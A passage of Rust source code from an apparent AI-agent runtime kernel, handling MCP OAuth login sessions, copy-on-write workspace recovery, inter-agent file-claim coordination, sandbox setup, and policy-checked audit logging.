                        issuer_hint.as_deref(),
                        clean_client.as_deref(),
                        hosts,
                        scopes,
                        eff_local,
                        300,
                        Some(prompt_cb),
                    )
                    .await;
                let done_ms = Utc::now().timestamp_millis();
                match res {
                    Ok(_) => {
                        if let Some(ref srv_id) = srv_task {
                            let _ = kernel
                                .mcp_firewall
                                .update_server_config(&org_task, srv_id, |rec| {
                                    if rec.auth_realm.is_none() {
                                        rec.auth_realm = Some(realm_task.clone());
                                    }
                                })
                                .await;
                        }
                        if let Some(s) = kernel.mcp_oauth_sessions.write().await.get_mut(&sid_task) {
                            s.status = "completed".to_string();
                            s.updated_at_ms = done_ms;
                        }
                    }
                    Err(e) => {
                        let (redacted, _) = aos_egress::redact_dlp_secrets(&e.to_string());
                        if let Some(s) = kernel.mcp_oauth_sessions.write().await.get_mut(&sid_task) {
                            s.status = "failed".to_string();
                            s.error = Some(redacted);
                            s.updated_at_ms = done_ms;
                        }
                    }
                }
            });
            if let Ok(Ok((uri, code))) =
                tokio::time::timeout(std::time::Duration::from_secs(8), prompt_rx).await
            {
                let mut guard = self.mcp_oauth_sessions.write().await;
                if let Some(s) = guard.get_mut(&session_id) {
                    s.verification_uri = Some(uri);
                    s.user_code = Some(code);
                    if s.status == "starting" {
                        s.status = "awaiting_user".to_string();
                    }
                    s.updated_at_ms = Utc::now().timestamp_millis();
                }
            }
        } else {
            let (url_tx, url_rx) = tokio::sync::oneshot::channel::<String>();
            let url_cb: AuthorizeUrlCallback = Box::new(move |url| {
                let _ = url_tx.send(url.to_string());
            });
            tokio::spawn(async move {
                let res = kernel
                    .mcp_oauth
                    .login_pkce_loopback(
                        &org_task,
                        &realm_task,
                        issuer_hint.as_deref(),
                        clean_client.as_deref(),
                        hosts,
                        scopes,
                        eff_local,
                        false,
                        300,
                        Some(url_cb),
                    )
                    .await;
                let done_ms = Utc::now().timestamp_millis();
                match res {
                    Ok(_) => {
                        if let Some(ref srv_id) = srv_task {
                            let _ = kernel
                                .mcp_firewall
                                .update_server_config(&org_task, srv_id, |rec| {
                                    if rec.auth_realm.is_none() {
                                        rec.auth_realm = Some(realm_task.clone());
                                    }
                                })
                                .await;
                        }
                        if let Some(s) = kernel.mcp_oauth_sessions.write().await.get_mut(&sid_task) {
                            s.status = "completed".to_string();
                            s.updated_at_ms = done_ms;
                        }
                    }
                    Err(e) => {
                        let (redacted, _) = aos_egress::redact_dlp_secrets(&e.to_string());
                        if let Some(s) = kernel.mcp_oauth_sessions.write().await.get_mut(&sid_task) {
                            s.status = "failed".to_string();
                            s.error = Some(redacted);
                            s.updated_at_ms = done_ms;
                        }
                    }
                }
            });
            if let Ok(Ok(auth_url)) =
                tokio::time::timeout(std::time::Duration::from_secs(8), url_rx).await
            {
                let mut guard = self.mcp_oauth_sessions.write().await;
                if let Some(s) = guard.get_mut(&session_id) {
                    s.authorize_url = Some(auth_url);
                    if s.status == "starting" {
                        s.status = "awaiting_user".to_string();
                    }
                    s.updated_at_ms = Utc::now().timestamp_millis();
                }
            }
        }

        tokio::task::yield_now().await;
        Ok(self
            .mcp_oauth_sessions
            .read()
            .await
            .get(&session_id)
            .cloned()
            .unwrap_or(init_session))
    }

    pub fn active_host_exec_runs(&self) -> usize {
        self.active_host_exec_runs
            .load(std::sync::atomic::Ordering::SeqCst)
    }

    pub async fn set_host_exec_config(&self, cfg: HostExecBrokerConfig) {
        *self.host_exec_config.write().await = Some(cfg);
    }

    pub fn rotate_operator_token(&self) -> String {
        let fresh = format!("aop_{}{}", Uuid::new_v4().simple(), Uuid::new_v4().simple());
        self.paas.set_secrets(&fresh, &self.paas.webhook_secret());
        fresh
    }

    pub async fn ensure_org_vault(&self, org_id: &str) -> anyhow::Result<VaultStatus> {
        let vault = self.vault.clone();
        let org = org_id.to_string();
        tokio::task::spawn_blocking(move || vault.ensure_org_unlocked(&org)).await?
    }

    async fn is_agent_live(
        &self,
        org_id: &str,
        agent_id: &str,
        peers: &[aos_core::PeerInfo],
    ) -> bool {
        if let Some(peer) = peers.iter().find(|p| p.agent_id == agent_id) {
            if let Some(pid) = peer.pid {
                return aos_core::session::is_pid_alive(pid, peer.start_time);
            }
            if peer.online {
                return true;
            }
        }
        self.agents
            .read()
            .await
            .contains_key(&Self::agent_key(org_id, agent_id))
    }

    pub async fn detect_orphaned_shadows(
        &self,
        identity: &AgentIdentity,
        host_source_root: &Path,
    ) -> Vec<Value> {
        let agents_dir = self
            .runtime_data_root
            .join("orgs")
            .join(&identity.org_id)
            .join("agents");
        let Ok(mut rd) = tokio::fs::read_dir(&agents_dir).await else {
            return Vec::new();
        };
        let peers = self.ipc.list_peers(&identity.org_id).await.unwrap_or_default();
        let mut orphaned = Vec::new();
        while let Ok(Some(entry)) = rd.next_entry().await {
            let other_id = entry.file_name().to_string_lossy().to_string();
            if other_id == identity.agent_id || other_id.starts_with('.') {
                continue;
            }
            if self.is_agent_live(&identity.org_id, &other_id, &peers).await {
                continue;
            }
            let cow_base = entry.path().join("cow_workspace");
            let orphan_upper = cow_base.join("upper_workspace");
            if !orphan_upper.is_dir() {
                continue;
            }
            let Ok(diffs) = CoWWorkspace::diff_dirs(host_source_root, &orphan_upper, None).await
            else {
                continue;
            };
            if diffs.is_empty() {
                continue;
            }
            let snapshots_count = tokio::fs::read(cow_base.join("snapshots.json"))
                .await
                .ok()
                .and_then(|b| serde_json::from_slice::<Vec<SnapshotMeta>>(&b).ok())
                .map(|s| s.len())
                .unwrap_or(0);
            let changed_paths_total = diffs.len();
            let changed_paths: Vec<String> = diffs
                .iter()
                .take(20)
                .map(|d| d.relative_path.clone())
                .collect();
            orphaned.push(json!({
                "agent_id": other_id,
                "uncommitted_changes_count": changed_paths_total,
                "changed_paths": changed_paths,
                "changed_paths_total": changed_paths_total,
                "snapshots_count": snapshots_count,
            }));
        }
        orphaned
    }

    pub async fn recover_orphaned_agent_shadow(
        &self,
        identity: &AgentIdentity,
        from_agent_id: &str,
    ) -> anyhow::Result<Value> {
        if from_agent_id.is_empty()
            || from_agent_id == "."
            || from_agent_id == ".."
            || from_agent_id.contains('/')
            || from_agent_id.contains('\\')
            || from_agent_id.contains("..")
            || from_agent_id.contains('*')
        {
            bail!("Invalid orphaned agent id '{}'", from_agent_id);
        }
        if from_agent_id == identity.agent_id {
            bail!("Cannot adopt shadow workspace from self ('{}')", from_agent_id);
        }
        self.ensure_org_vault(&identity.org_id).await?;
        let env = self.get_agent_environment(identity).await?;
        let peers = self.ipc.list_peers(&identity.org_id).await.unwrap_or_default();
        if self
            .is_agent_live(&identity.org_id, from_agent_id, &peers)
            .await
        {
            bail!(
                "Agent '{}' is still alive; cannot adopt an active shadow workspace",
                from_agent_id
            );
        }
        let orphan_upper = self
            .runtime_data_root
            .join("orgs")
            .join(&identity.org_id)
            .join("agents")
            .join(from_agent_id)
            .join("cow_workspace")
            .join("upper_workspace");
        if !orphan_upper.is_dir() {
            bail!(
                "Orphaned shadow workspace for agent '{}' not found",
                from_agent_id
            );
        }

        let diffs =
            CoWWorkspace::diff_dirs(env.workspace.host_source_root(), &orphan_upper, None).await?;
        let pre_snap = env.workspace.create_snapshot("pre-orphan-recovery").await?;
        let mut recovered_paths = Vec::new();
        for entry in diffs {
            let (clean, dst_path) =
                shadow_path_for_write(env.workspace.shadow_root(), &entry.relative_path)?;
            match entry.change_type {
                DiffChangeType::Added | DiffChangeType::Modified => {
                    let src_path = orphan_upper.join(&clean);
                    let bytes = tokio::fs::read(&src_path).await.with_context(|| {
                        format!("reading orphaned shadow file '{}'", src_path.display())
                    })?;
                    aos_core::session::write_bytes_atomic_synced_async(&dst_path, bytes).await?;
                    recovered_paths.push(clean);
                }
                DiffChangeType::Deleted => {
                    if dst_path.exists() {
                        tokio::fs::remove_file(&dst_path).await?;
                        recovered_paths.push(clean);
                    }
                }
            }
        }

        Ok(json!({
            "status": "recovered_orphaned_shadow",
            "from_agent_id": from_agent_id,
            "pre_recovery_snapshot_id": pre_snap.snapshot_id,
            "recovered_paths_count": recovered_paths.len(),
            "recovered_paths": recovered_paths,
        }))
    }

    /// Attach an already-created workspace/sandbox environment to this kernel. The launcher uses
    /// this so MCP tools operate on the same CoW shadow as the agent's native tools instead of
    /// creating a second shadow under `runtime/orgs/...`.
    pub async fn attach_agent_environment(&self, identity: &AgentIdentity, env: AgentEnvironment) {
        let key = Self::agent_key(&identity.org_id, &identity.agent_id);
        self.agents.write().await.insert(key, Arc::new(env));
    }

    pub async fn get_agent_environment(
        &self,
        identity: &AgentIdentity,
    ) -> anyhow::Result<Arc<AgentEnvironment>> {
        let key = Self::agent_key(&identity.org_id, &identity.agent_id);
        self.agents
            .read()
            .await
            .get(&key)
            .cloned()
            .with_context(|| format!("Agent environment '{}' is not initialized", key))
    }

    fn agent_key(org_id: &str, agent_id: &str) -> String {
        format!("{}::{}", org_id, agent_id)
    }

    /// Agent ids whose heartbeat is Active or Idle in `org_id`.
    async fn live_peer_ids(&self, org_id: &str) -> std::collections::HashSet<String> {
        self.ipc
            .list_peers(org_id)
            .await
            .unwrap_or_default()
            .into_iter()
            .filter(|p| p.online)
            .map(|p| p.agent_id)
            .collect()
    }

    /// If the agent has an unambiguous active A2A task where it is the **assignee** (`to_agent`),
    /// treat that task as the trusted task context for task-scoped leases, claims, and child
    /// task delegation (`parent_task_id`).
    async fn active_task_id(&self, identity: &AgentIdentity) -> Option<String> {
        let tasks = self
            .ipc
            .list_tasks(Some(&identity.org_id), Some(&identity.agent_id))
            .await
            .ok()?;
        let active_assigned: Vec<_> = tasks
            .into_iter()
            .filter(|task| {
                task.is_assignee(&identity.org_id, &identity.agent_id)
                    && !task.state.is_terminal()
                    && !task.stale
            })
            .collect();
        if active_assigned.len() == 1 {
            return Some(active_assigned[0].id.clone());
        }
        let working: Vec<_> = active_assigned
            .iter()
            .filter(|task| task.state == A2ATaskState::Working)
            .collect();
        if working.len() == 1 {
            return Some(working[0].id.clone());
        }
        None
    }

    /// Releases any claims bound to the specified `task_ids` and broadcasts a coordination release event.
    async fn release_claims_for_tasks(
        &self,
        identity: &AgentIdentity,
        task_ids: &[String],
    ) -> Vec<String> {
        if task_ids.is_empty() {
            return Vec::new();
        }
        for _attempt in 0..5 {
            let Ok((mut table, version)) = self.load_claims(&identity.org_id).await else {
                return Vec::new();
            };
            let mut released_globs = Vec::new();
            for tid in task_ids {
                let rel = claims::release_claims_for_task(&mut table, tid);
                if !rel.is_empty() {
                    let globs: Vec<String> = rel.into_iter().map(|(g, _)| g).collect();
                    let _ = self.ipc.record_task_claims(tid, &globs, true).await;
                    released_globs.extend(globs);
                }
            }
            if released_globs.is_empty() {
                return Vec::new();
            }
            let Ok(value) = serde_json::to_value(&table) else {
                return Vec::new();
            };
            match self
                .org_storage
                .kv_put(
                    identity,
                    claims::CLAIMS_NAMESPACE,
                    claims::CLAIMS_KEY,
                    value,
                    version,
                )
                .await
            {
                Ok(_) => {
                    self.announce_coordination(
                        identity,
                        format!(
                            "[coord] {} auto-released {} (task completed/canceled)",
                            identity.agent_id,
                            released_globs.join(", ")
                        ),
                        json!({
                            "event": "released",
                            "owner": identity.agent_id,
                            "paths": released_globs,
                            "task_ids": task_ids
                        }),
                    )
                    .await;
                    return released_globs;
                }
                Err(e) if e.to_string().contains("version mismatch") => continue,
                Err(_) => return Vec::new(),
            }
        }
        Vec::new()
    }

    /// Releases claims owned by `identity.agent_id` that cover `committed_paths`.
    pub async fn release_claims_matching_committed_paths(
        &self,
        identity: &AgentIdentity,
        committed_paths: &[String],
    ) -> Vec<String> {
        if committed_paths.is_empty() {
            return Vec::new();
        }
        for _attempt in 0..5 {
            let Ok((mut table, version)) = self.load_claims(&identity.org_id).await else {
                return Vec::new();
            };
            let released =
                claims::release_claims_matching_paths(&mut table, &identity.agent_id, committed_paths);
            if released.is_empty() {
                return Vec::new();
            }
            let Ok(value) = serde_json::to_value(&table) else {
                return Vec::new();
            };
            match self
                .org_storage
                .kv_put(
                    identity,
                    claims::CLAIMS_NAMESPACE,
                    claims::CLAIMS_KEY,
                    value,
                    version,
                )
                .await
            {
                Ok(_) => {
                    if let Some(tid) = self.active_task_id(identity).await {
                        let _ = self.ipc.record_task_claims(&tid, &released, true).await;
                    }
                    self.announce_coordination(
                        identity,
                        format!(
                            "[coord] {} auto-released {} on workspace_commit",
                            identity.agent_id,
                            released.join(", ")
                        ),
                        json!({
                            "event": "released",
                            "owner": identity.agent_id,
                            "paths": released,
                            "committed_paths": committed_paths
                        }),
                    )
                    .await;
                    return released;
                }
                Err(e) if e.to_string().contains("version mismatch") => continue,
                Err(_) => return Vec::new(),
            }
        }
        Vec::new()
    }

    /// Cleans up all resources (`TaskScoped` leases, UOMP memory sessions, and bound file claims)
    /// for a terminal task and any of its subtasks that have also reached a terminal state.
    async fn cleanup_terminal_task(&self, identity: &AgentIdentity, root_task_id: &str) {
        let mut terminal_ids = vec![root_task_id.to_string()];
        if let Ok(subtasks) = self.ipc.list_subtasks(root_task_id).await {
            for sub in subtasks {
                if sub.visible_to_org(&identity.org_id)
                    && sub.state.is_terminal()
                    && !terminal_ids.contains(&sub.id)
                {
                    terminal_ids.push(sub.id);
                }
            }
        }
        for tid in &terminal_ids {
            let _ = self.policy.revoke_leases_for_task(tid).await;
            self.revoke_memory_for_task(tid).await;
        }
        let _ = self.release_claims_for_tasks(identity, &terminal_ids).await;
    }

    /// Best-effort reverse propagation: when an A2A task reaches a terminal state, ask the local
    /// UOMP memory server to revoke sessions bound to that task. Configure with
    /// `AOS_MEMORY_URL` + `AOS_MEMORY_BRIDGE_TOKEN`.
    async fn revoke_memory_for_task(&self, task_id: &str) {
        let Some(url) = self.memory_url.clone() else {
            return;
        };
        let task_token = self.memory_task_secret.as_ref().and_then(|secret| {
            let timestamp = Utc::now().timestamp();
            let mut mac = <Hmac<Sha256> as Mac>::new_from_slice(secret.as_bytes()).ok()?;
            mac.update(format!("{task_id}:{timestamp}").as_bytes());
            Some(format!(
                "{task_id}:{timestamp}:{}",
                hex::encode(mac.finalize().into_bytes())
            ))
        });
        let bridge_token = self.memory_bridge_token.clone();
        if task_token.is_none() && bridge_token.is_none() {
            return;
        }
        let endpoint = format!("{url}/v1/sessions/revoke-by-task");
        let body = json!({ "task_id": task_id });
        let _ = tokio::task::spawn_blocking(move || {
            let mut request = ureq::post(&endpoint);
            if let Some(token) = task_token {
                request = request.set("x-aegis-task-token", &token);
            } else if let Some(token) = bridge_token {
                request = request.set("x-uomp-bridge-token", &token);
            }
            let _ = request.send_json(body);
        })
        .await;
    }

    /// Current claim table and its KV version (None if the key does not exist yet).
    pub async fn load_claims(&self, org_id: &str) -> anyhow::Result<(claims::ClaimTable, Option<u64>)> {
        let entry = self
            .org_storage
            .kv_get(org_id, claims::CLAIMS_NAMESPACE, claims::CLAIMS_KEY)
            .await?;
        Ok(match entry {
            Some(e) => (claims::parse_claims(&e.value), Some(e.version)),
            None => (claims::ClaimTable::new(), None),
        })
    }

    /// First conflict message for any of `paths` claimed by another live principal.
    pub async fn claim_conflict_for_paths(
        &self,
        identity: &AgentIdentity,
        paths: &[String],
    ) -> anyhow::Result<Option<String>> {
        if paths.is_empty() {
            return Ok(None);
        }
        let (table, _) = self.load_claims(&identity.org_id).await?;
        if table.is_empty() {
            return Ok(None);
        }
        let live = self.live_peer_ids(&identity.org_id).await;
        let now_ms = Utc::now().timestamp_millis();
        for p in paths {
            if let Some((glob, claim)) =
                claims::find_conflict(&table, p, &identity.agent_id, now_ms, |o| live.contains(o))
            {
                return Ok(Some(claims::conflict_message(glob, claim, p, now_ms)));
            }
        }
        Ok(None)
    }

    async fn announce_coordination(&self, identity: &AgentIdentity, subject: String, payload: Value) {
        let _ = self
            .ipc
            .send(IpcEnvelope {
                msg_id: String::new(),
                org_id: identity.org_id.clone(),
                from_agent: identity.agent_id.clone(),
                to_target: "topic:topic://coordination".to_string(),
                kind: IpcKind::TopicBroadcast {
                    topic: "topic://coordination".to_string(),
                },
                subject,
                payload,
                attachments: vec![],
                status: MessageDeliveryStatus::Unread,
                created_at_ms: 0,
            })
            .await;
    }

    /// `coord_claim` / `coord_release`: CAS read-modify-write of `coordination/claims` with retries,
    /// plus an automatic `topic://coordination` broadcast so peers learn about it via push hooks.
    async fn coord_claims_tool(
        &self,
        identity: &AgentIdentity,
        tool_name: &str,
        args: &Value,
    ) -> anyhow::Result<Value> {
        let paths: Vec<String> = args
            .get("paths")
            .and_then(|v| serde_json::from_value(v.clone()).ok())
            .unwrap_or_default();
        let ttl_secs = args
            .get("ttl_secs")
            .and_then(|v| v.as_i64())
            .filter(|t| *t > 0)
            .unwrap_or(claims::DEFAULT_CLAIM_TTL_SECS)
            .min(24 * 3600);
        let note = args.get("note").and_then(|v| v.as_str()).unwrap_or("").to_string();
        let claim_mode = args
            .get("mode")
            .and_then(|v| v.as_str())
            .map(|mode| {
                claims::ClaimMode::from_name(mode)
                    .ok_or_else(|| anyhow::anyhow!("coord_claim mode must be 'read' or 'write'"))
            })
            .transpose()?
            .unwrap_or(claims::ClaimMode::Write);
        if tool_name == "coord_claim" && paths.is_empty() {
            bail!("coord_claim requires a non-empty 'paths' array (globs relative to the repo root)");
        }
        let bound_task_id: Option<String> = args
            .get("task_id")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .map(str::to_string)
            .or(self.active_task_id(identity).await);
        let workspace_files: Vec<String> = {
            let key = Self::agent_key(&identity.org_id, &identity.agent_id);
            let env_opt = self.agents.read().await.get(&key).cloned();
            if let Some(env) = env_opt {
                CoWWorkspace::collect_files(env.workspace.shadow_root())
                    .await
                    .unwrap_or_default()
                    .into_iter()
                    .map(|(rel, _)| rel)
                    .collect()
            } else {
                Vec::new()
            }
        };

        for _attempt in 0..8 {
            let (mut table, version) = self.load_claims(&identity.org_id).await?;
            let now_ms = Utc::now().timestamp_millis();
            claims::prune_expired(&mut table, now_ms);
            let live = self.live_peer_ids(&identity.org_id).await;
            let mut changed = Vec::new();
            let mut rejected = Vec::new();
            let expires_at_ms = now_ms + ttl_secs * 1000;

            if tool_name == "coord_claim" {
                for glob in &paths {
                    let clash = table.iter().find(|(g, c)| {
                        c.owner != identity.agent_id
                            && live.contains(&c.owner)
                            && (claim_mode == claims::ClaimMode::Write
                                || c.mode == claims::ClaimMode::Write)
                            && claims::globs_may_overlap(g, glob, &workspace_files)
                    });
                    match clash {
                        Some((g, c)) => rejected.push(json!({
                            "path": glob,
                            "held_by": c.owner,
                            "pattern": claims::claim_glob(g),
                            "mode": c.mode,
                            "expires_at_ms": c.expires_at_ms
                        })),
                        None => {
                            let key = claims::claim_key(glob, &identity.agent_id, claim_mode);
                            table.insert(
                                key,
                                claims::Claim {
                                    owner: identity.agent_id.clone(),
                                    expires_at_ms,
                                    note: note.clone(),
                                    task_id: bound_task_id.clone(),
                                    mode: claim_mode,
                                },
                            );
                            changed.push(glob.clone());
                        }
                    }
                }
            } else {
                let mine: Vec<String> = table
                    .iter()
                    .filter(|(g, c)| {
                        c.owner == identity.agent_id
                            && (paths.is_empty()
                                || paths.contains(g)
                                || paths.iter().any(|p| p == claims::claim_glob(g)))
                    })
                    .map(|(g, _)| g.clone())
                    .collect();
                for g in mine {
                    table.remove(&g);
                    changed.push(claims::claim_glob(&g).to_string());
                }
            }

            let value = serde_json::to_value(&table)?;
            match self
                .org_storage
                .kv_put(identity, claims::CLAIMS_NAMESPACE, claims::CLAIMS_KEY, value, version)
                .await
            {
                Ok(entry) => {
                    if !changed.is_empty() {
                        if let Some(ref tid) = bound_task_id {
                            let _ = self
                                .ipc
                                .record_task_claims(tid, &changed, tool_name != "coord_claim")
                                .await;
                        }
                        let verb = if tool_name == "coord_claim" { "claimed" } else { "released" };
                        if tool_name == "coord_claim" {
                            let claim_summary = if note.is_empty() {
                                format!("Owns {}", changed.join(", "))
                            } else {
                                format!("Owns {} ({})", changed.join(", "), note)
                            };
                            let claim_skills: Vec<AgentSkill> = changed
                                .iter()
                                .map(|g| AgentSkill {
                                    id: format!("claim:{}", g),
                                    name: format!("Claimed {}", g),
                                    description: claim_summary.clone(),
                                    tags: vec![
                                        "claimed".to_string(),
                                        identity.org_id.clone(),
                                        g.clone(),
                                    ],
                                })
                                .collect();
                            let _ = self
                                .ipc
                                .update_agent_card(identity, Some(claim_summary), claim_skills)
                                .await;
                        }
                        self.announce_coordination(
                            identity,
                            format!("[coord] {} {} {}", identity.agent_id, verb, changed.join(", ")),
                            json!({ "event": verb, "owner": identity.agent_id, "paths": changed, "expires_at_ms": expires_at_ms, "note": note }),
                        )
                        .await;
                    }
                    return Ok(json!({
                        "status": if rejected.is_empty() { "ok" } else { "partial" },
                        "agent_id": identity.agent_id,
                        "changed": changed,
                        "rejected": rejected,
                        "expires_at_ms": if tool_name == "coord_claim" { json!(expires_at_ms) } else { Value::Null },
                        "claims_version": entry.version
                    }));
                }
                Err(e) if e.to_string().contains("version mismatch") => continue,
                Err(e) => return Err(e),
            }
        }
        bail!("coord: could not update claims after 5 concurrent-modification retries")
    }

    /// Compact unread-mail summary piggybacked on every `tools/call` result, so clients without push
    /// hooks (e.g. Codex) still learn about peer messages on their next tool call.
    pub async fn inbox_summary(&self, identity: &AgentIdentity) -> Option<Value> {
        let msgs = self
            .ipc
            .peek_inbox(&identity.org_id, &identity.agent_id, 20)
            .await
            .ok()?;
        if msgs.is_empty() {
            return None;
        }
        let subjects: Vec<String> = msgs
            .iter()
            .take(3)
            .map(|m| format!("{} from {}: {}", m.msg_id, m.from_agent, m.subject))
            .collect();
        Some(json!({
            "unread": msgs.len(),
            "latest": subjects,
            "hint": "Read with ipc_recv, answer with ipc_send/ipc_reply, then ipc_ack."
        }))
    }

    pub async fn ensure_agent_environment(
        &self,
        identity: AgentIdentity,
        host_project_source: impl AsRef<Path>,
        tier: IsolationTier,
        subscribed_topics: Vec<String>,
    ) -> anyhow::Result<Arc<AgentEnvironment>> {
        self.ensure_org_vault(&identity.org_id).await?;
        let canon_host = std::fs::canonicalize(host_project_source.as_ref())
            .unwrap_or_else(|_| host_project_source.as_ref().to_path_buf());
        let key = Self::agent_key(&identity.org_id, &identity.agent_id);
        if let Some(existing) = self.agents.read().await.get(&key) {
            if existing.workspace.host_source_root() == canon_host.as_path()
                && (existing.workspace.shadow_root().join(".initialized").exists()
                    || (existing.workspace.shadow_root().exists()
                        && existing
                            .workspace
                            .shadow_root()
                            .parent()
                            .is_some_and(|p| p.join(".initialized").exists())))
            {
                return Ok(existing.clone());
            }
        }

        let agent_root = self
            .runtime_data_root
            .join("orgs")
            .join(&identity.org_id)
            .join("agents")
            .join(&identity.agent_id);

        let default_cow_base = agent_root.join("cow_workspace");
        let marker_host = std::fs::read_to_string(default_cow_base.join(".host_source_root"))
            .ok()
            .map(|s| PathBuf::from(s.trim()));
        let cow_base = if identity.org_id == aos_core::session::DEFAULT_PERSONAL_ORG_ID
            || marker_host.as_ref().is_some_and(|h| h != &canon_host)
        {
            let ws_id = aos_core::session::workspace_id_for_path(&canon_host);
            agent_root.join("workspaces").join(ws_id).join("cow_workspace")
        } else {
            default_cow_base
        };
        let agent_home = if cow_base == agent_root.join("cow_workspace") {
            agent_root.join("home")
        } else {
            cow_base.parent().unwrap_or(&agent_root).join("home")
        };
        let org_shared_ro = self
            .runtime_data_root
            .join("orgs")
            .join(&identity.org_id)
            .join("shared_ro");
        let org_agent_pub = self
            .runtime_data_root
            .join("orgs")
            .join(&identity.org_id)
            .join("pub")
            .join(&identity.agent_id);

        tokio::fs::create_dir_all(&agent_home).await?;
        tokio::fs::create_dir_all(&cow_base).await?;
        tokio::fs::create_dir_all(&org_shared_ro).await?;
        tokio::fs::create_dir_all(&org_agent_pub).await?;

        let ws = Arc::new(CoWWorkspace::init(&canon_host, &cow_base).await?);
        let _ = tokio::fs::write(
            cow_base.join(".host_source_root"),
            canon_host.to_string_lossy().as_bytes(),
        )
        .await;

        let sbx_config = SandboxConfig {
            identity: identity.clone(),
            tier,
            limits: ResourceLimits::default(),
            workspace_dir: ws.shadow_root().to_path_buf(),
            agent_home_dir: agent_home,
            org_shared_ro_dir: org_shared_ro,
            org_agent_pub_dir: org_agent_pub,
            egress_proxy_addr: None,
            host_source_dir: Some(ws.host_source_root().to_path_buf()),
            tighten_home_read: true,
            allowed_loopback_ports: aos_sandbox::allocate_loopback_ports(2, &[]),
            isolate_loopback_only: true,
        };

        let driver: Box<dyn SandboxDriver> = match tier {
            IsolationTier::NativeOsSandbox => Box::new(NativeOsSandboxDriver),
            IsolationTier::MicroVm => Box::new(MicroVmSandboxDriver),
        };
        let sandbox = driver.create_sandbox(sbx_config).await?;

        self.ipc
            .register_peer(&identity, subscribed_topics)
            .await?;
        let _ = self
            .ipc
            .update_peer_metadata(
                &identity,
                None,
                None,
                None,
                Some(host_project_source.as_ref().display().to_string()),
            )
            .await;

        let env = Arc::new(AgentEnvironment {
            identity,
            workspace: ws,
            sandbox,
        });

        self.agents.write().await.insert(key, env.clone());
        Ok(env)
    }

    /// Triggers an automatic CoW rebase (`refresh_from_host`) for an already-initialized Agent environment.
    pub async fn refresh_agent_workspace(
        &self,
        identity: &AgentIdentity,
    ) -> anyhow::Result<aos_core::RefreshReport> {
        let key = Self::agent_key(&identity.org_id, &identity.agent_id);
        let Some(env) = self.agents.read().await.get(&key).cloned() else {
            return Ok(aos_core::RefreshReport::default());
        };
        env.workspace.refresh_from_host().await
    }

    /// Evicts in-memory sandbox handles for the specified agents when a Cloud Workspace transitions
    /// to Scale-to-Zero (`Hibernated`), while preserving CoW shadow directories on disk.
    pub async fn evict_agent_environments(&self, org_id: &str, agents: &[String]) -> usize {
        let mut guard = self.agents.write().await;
        let mut evicted = 0;
        for agent_id in agents {
            let key = Self::agent_key(org_id, agent_id);
            if guard.remove(&key).is_some() {
                evicted += 1;
            }
        }
        evicted
    }

    pub(crate) async fn authorize_and_audit(
        &self,
        identity: &AgentIdentity,
        action: &str,
        target_org_id: &str,
        target_resource: &str,
        mut metadata: Value,
    ) -> anyhow::Result<PolicyDecision> {
        if let Some(task_id) = self.active_task_id(identity).await {
            if let Some(object) = metadata.as_object_mut() {
                object.insert("task_id".to_string(), json!(task_id));
            }
        }
        let ctx = PolicyContext {
            principal: identity.clone(),
            action: action.to_string(),
            target_org_id: target_org_id.to_string(),
            target_resource: target_resource.to_string(),
            metadata: metadata.clone(),
        };
        let decision = self.policy.evaluate(&ctx).await?;
        let decision_label = match &decision {
            PolicyDecision::Allow { matched_rule } => format!("allow:{}", matched_rule),
            PolicyDecision::Ask { escalation_id, .. } => format!("ask:{}", escalation_id),
            PolicyDecision::Deny { .. } => "deny".to_string(),
        };

        self.recorder
            .record(AuditEvent {
                event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
                timestamp_ms: Utc::now().timestamp_millis(),
                org_id: identity.org_id.clone(),
                agent_id: identity.agent_id.clone(),
                action: action.to_string(),
                resource: target_resource.to_string(),
                policy_decision: decision_label,
                snapshot_id: None,
                details: metadata,
                task_id: None,
                prev_hash: None,
                event_hash: None,
            })
            .await?;

        Ok(decision)
    }

    async fn memory_policy_evaluate(
        &self,
        identity: &AgentIdentity,
        args: Value,
    ) -> anyhow::Result<Value> {
        let action = args
            .get("action")
            .and_then(|v| v.as_str())
            .unwrap_or("read");
        let resource = args
            .get("resource")
            .and_then(|v| v.as_str())
            .context("Missing 'resource' (e.g. memory:tag:notes/projects)")?;
        let memory_action = match action {
            "read" => MemoryAction::Read,
            "write" => MemoryAction::Write,
            "delete" => MemoryAction::Delete,
            other => bail!("Unknown memory action '{}'", other),
        };

        let decision = self
            .authorize_and_audit(
                identity,
                memory_action.as_str(),
                &identity.org_id,
                resource,
                json!({
                    "protocol": "uomp",
                    "protocol_version": "1.0",
                    "resource": resource,
                }),
            )
            .await?;

        Ok(match decision {
            PolicyDecision::Allow { matched_rule } => json!({
                "protocol": "uomp",
                "decision": "allow",
                "action": memory_action.as_str(),
                "resource": resource,
                "matched_rule": matched_rule,
            }),
            PolicyDecision::Ask {
                escalation_id,
                reason,
                suggested_lease_scope,
            } => json!({
                "protocol": "uomp",
                "decision": "ask",
                "action": memory_action.as_str(),
                "resource": resource,
                "escalation_id": escalation_id,
                "reason": reason,
                "suggested_lease_scope": suggested_lease_scope,
            }),
            PolicyDecision::Deny { reason } => json!({
                "protocol": "uomp",
                "decision": "deny",
                "action": memory_action.as_str(),
                "resource": resource,
                "reason": reason,
            }),
        })
    }
}

impl AegisRuntimeKernel {
    /// Core JSON-RPC 2.0 MCP message processor shared by both Stdio and Streamable HTTP transports.
    pub async fn handle_jsonrpc_message(
        &self,
        identity: &AgentIdentity,
        req: Value,
    ) -> anyhow::Result<Value> {
        self.handle_jsonrpc_message_with_profile(
            identity,
            req,
            GatewayToolProfile::from_str_or_env(None),
        )
        .await
    }

    pub async fn handle_jsonrpc_message_with_profile(
        &self,
        identity: &AgentIdentity,
        req: Value,
        profile: GatewayToolProfile,
    ) -> anyhow::Result<Value> {
        let id = req.get("id").cloned().unwrap_or(Value::Null);
        let method = req.get("method").and_then(|v| v.as_str()).unwrap_or("");

        let response = match method {
            "initialize" => json!({
                "jsonrpc": "2.0",
                "id": id,
                "result": {
                    "protocolVersion": "2024-11-05",
                    "serverInfo": {
                        "name": "aegis-os-runtime",
                        "version": env!("CARGO_PKG_VERSION")
                    },
                    "capabilities": {
                        "tools": { "listChanged": true },
                        "resources": { "subscribe": true, "listChanged": true }
                    },
                    "instructions": Self::MCP_SERVER_INSTRUCTIONS
                }
            }),
            "tools/list" => {
                json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": Self::mcp_tools_schema_for_profile(profile)
                })
            }
            "resources/list" => {
                let resources = vec![
